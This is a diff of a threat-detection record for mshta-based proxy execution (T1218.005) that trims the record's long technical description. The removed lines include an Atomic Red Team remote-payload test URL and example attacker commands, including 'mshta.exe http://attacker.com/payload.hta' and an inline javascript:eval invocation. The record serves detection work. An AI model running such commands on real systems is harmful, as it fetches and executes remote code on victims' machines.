@@ -2,7 +2,7 @@ criticality: High
 metadata:
   author: hunt3r (HUNT3R)
   created: '2026-03-31T13:40:34.703371+00:00'
-  modified: '2026-05-05T10:15:40.474417+00:00'
+  modified: '2026-05-21T18:23:02.268692+00:00'
   schema: tvm::2.1
   tlp: amber
   uuid: e40c4c92-a29f-45d9-a1ae-9b094611a6a8
@@ -17,21 +17,6 @@ threat:
   severity: Significant incident
   surface:
   - network::IP Address
-  - host::Hostname
-  terrain: "Implemented based on Detecting Mshta-based Proxy Execution via Suspicious\
-    \ HTA or Script Invocation (AN1397).\n\nMshta executes JavaScript Scheme Fetch\
-    \ Remote Payload With GetObject\nTest execution of a remote script using mshta.exe.\
-    \ Upon execution calc.exe will be launched.\n\nSupported Platforms: Windows\n\n\
-    Inputs\nName\tDescription\tType\tDefault Value\nfile_url\tlocation of the payload\t\
-    url\thttps://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct\n\
-    \nTechnical Overview of T1218.005\nThe mshta.exe (Microsoft HTML Application Host)\
-    \ utility is responsible for executing .hta files. These files are essentially\
-    \ HTML documents that can include scripting languages like JavaScript (JScript)\
-    \ or VBScript. Unlike scripts running in a standard browser, HTA files run with\
-    \ the privileges of the user and are not restricted by the \"sandbox\" or \"Same-Origin\
-    \ Policy.\"\n\nExecution Mechanism\nWhen mshta.exe is called, it initializes the\
-    \ script engine specified in the source. Attackers often bypass the need for a\
-    \ physical .hta file by passing the script directly via a URL or an inline protocol\
-    \ handler:\n\nInline Execution: mshta.exe javascript:eval(\"...\")\n\nRemote Fetch:\
-    \ mshta.exe http://attacker.com/payload.hta"
+  terrain: Implemented based on Detecting Mshta-based Proxy Execution via Suspicious
+    HTA or Script Invocation (AN1397).
   viability: Roughly even chance
